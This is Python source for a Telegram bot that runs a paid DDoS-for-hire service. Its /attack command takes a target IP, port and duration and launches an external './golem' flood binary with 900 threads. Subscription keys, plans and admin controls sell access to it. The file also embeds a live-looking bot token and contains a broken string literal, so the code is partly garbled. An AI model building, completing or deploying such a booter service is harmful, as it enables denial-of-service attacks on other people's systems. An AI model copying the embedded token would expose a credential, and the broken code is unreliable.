import logging
import subprocess
import os
import time
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext, MessageHandler, Filters

# Setup logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# Global variable to track bot maintenance status
maintenance_mode = False

# To store user plans, example data
user_plans = {}

# To store active attacks
active_attacks = {}

# Handler to start the bot
def start(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    update.message.reply_text(f"Hello! Your user profile is initialized with ID: {user_id}")

# Handler to verify access
def verify(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    # Check if user joined the channel (-1002330090522)
    # This is a placeholder; you will need to implement channel checking logic.
    user_has_access = True  # Dummy value for now
    if user_has_access:
        update.message.reply_text("You are verified to use the bot!")
    else:
        update.message.reply_text("You need to join the channel to verify your access.")

# Handler to attack
def attack(update: Update, context: CallbackContext) -> None:
    if maintenance_mode:
        update.message.reply_text("Bot is in maintenance mode. Please try again later.")
        return

    try:
        ip = context.args[0]
        port = context.args[1]
        duration = int(context.args[2])
        # Start attack in the background
        attack_id = str(update.message.from_user.id)
        update.message.reply_text(f"Starting attack on {ip}:{port} for {duration} seconds.")
        
        # Run the external attack command with given parameters (./golem IP port time threads)
        subprocess.Popen(['./golem', ip, port, str(duration), '900'])  # You may replace with your attack logic
        
        # Set attack countdown
        active_attacks[attack_id] = duration
        while duration > 0:
            time.sleep(1)
            duration -= 1
            update.message.reply_text(f"Time remaining: {duration} seconds.")
        
        # Send end message and gif after attack ends
        update.message.reply_text("*Attack Ended*")
        update.message.reply_animation(')  # Replace with real GIF URL

        del active_attacks[attack_id]
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /attack <IP> <Port> <Duration>")

# Handler to check subscription plan
def checkplan(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    plan_details = user_plans.get(user_id, "No subscription found.")
    update.message.reply_text(f"Your subscription details: {plan_details}")

# Handler to activate a subscription key
def activatekey(update: Update, context: CallbackContext) -> None:
    key = context.args[0]
    # Implement your key activation logic here
    update.message.reply_text(f"Subscription key {key} activated!")

# Handler to display help
def help(update: Update, context: CallbackContext) -> None:
    help_text = """
    User Commands:
    /start - Start the bot
    /verify - Verify your access to use the bot
    /attack <IP> <Port> <Duration> - Launch an attack
    /checkplan - View your subscription details
    /activatekey <key> - Activate a subscription key
    /help - Display this help message

    Admin Commands:
    /setplan <user_id> <duration> <max_duration> - Assign a paid plan to a user
    /adjustplan <user_id> <time_adjustment> - Adjust expiration time
    /generatekey <type> <duration> <max_duration> - Generate a subscription key
    /resetkey <key> <reset/block> - Reset or block a subscription key
    /resetattacks <user_id> - Reset daily attack limits for a user
    /maintenance - Toggle maintenance mode
    /broadcast <message> - Send a message to all users
    /uptime - Check bot uptime
    """
    update.message.reply_text(help_text)

# Admin commands to manage subscription, etc.
def setplan(update: Update, context: CallbackContext) -> None:
    if not is_admin(update.message.from_user.id):
        update.message.reply_text("You are not authorized to use this command.")
        return
    user_id = int(context.args[0])
    duration = int(context.args[1])
    max_duration = int(context.args[2])
    user_plans[user_id] = f"Plan set for {duration} days, Max duration: {max_duration} days."
    update.message.reply_text(f"Plan set for user {user_id}.")

def is_admin(user_id):
    # Add admin check logic here
    return user_id == 7584228621  # Replace with your admin ID

# Bot uptime check
def uptime(update: Update, context: CallbackContext) -> None:
    current_time = time.time()
    bot_start_time = current_time - start_time
    update.message.reply_text(f"Bot has been up for {bot_start_time} seconds.")

# Maintenance toggle
def maintenance(update: Update, context: CallbackContext) -> None:
    global maintenance_mode
    maintenance_mode = not maintenance_mode
    status = "enabled" if maintenance_mode else "disabled"
    update.message.reply_text(f"Maintenance mode {status}.")

# Broadcast message to all users
def broadcast(update: Update, context: CallbackContext) -> None:
    if not is_admin(update.message.from_user.id):
        update.message.reply_text("You are not authorized to use this command.")
        return
    message = " ".join(context.args)
    # Implement logic to send broadcast message to all users
    update.message.reply_text(f"Broadcast message: {message}")

# Feedback handler
def handle_feedback(update: Update, context: CallbackContext) -> None:
    feedback = update.message.text
    # Forward feedback to admin or handle it
    update.message.reply_text("Your feedback has been forwarded to the admin.")

# Main function to run the bot
def main() -> None:
    global start_time
    start_time = time.time()  # Save the bot start time
    
    # Bot token, replace with your token
    token = '7242024865:AAFD6SVsYkfQP-l7Gv5DTtYd7tQp-iFSxGc'

    updater = Updater(token)

    dispatcher = updater.dispatcher

    # Register handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("verify", verify))
    dispatcher.add_handler(CommandHandler("attack", attack))
    dispatcher.add_handler(CommandHandler("checkplan", checkplan))
    dispatcher.add_handler(CommandHandler("activatekey", activatekey))
    dispatcher.add_handler(CommandHandler("help", help))
    dispatcher.add_handler(CommandHandler("setplan", setplan))
    dispatcher.add_handler(CommandHandler("uptime", uptime))
    dispatcher.add_handler(CommandHandler("maintenance", maintenance))
    dispatcher.add_handler(CommandHandler("broadcast", broadcast))

    # Handler for feedback or photo
    dispatcher.add_handler(MessageHandler(Filters.text, handle_feedback))
    dispatcher.add_handler(MessageHandler(Filters.photo, handle_feedback))

    # Start the bot
    updater.start_polling()

    updater.idle()

if __name__ == '__main__':
    main()
